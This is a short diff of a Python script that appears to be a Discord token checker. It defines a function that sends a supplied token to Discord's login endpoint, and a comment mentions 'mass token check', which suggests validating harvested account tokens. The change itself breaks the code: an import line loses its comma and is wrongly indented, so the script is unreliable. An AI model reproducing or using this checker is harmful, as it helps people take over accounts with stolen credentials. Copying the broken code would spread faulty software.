@@ -61,8 +61,8 @@ if opcion=='1':
             pass
     pass
 if opcion=='2':
-from requests import get, post
-from random import randint
+ from requests import get post
+ from random import randint
 
 def variant1(token):
     response = get('https://discord.com/api/v6/auth/login', headers={"Authorization": token})#Bad variant for mass token check due to the rate limit.
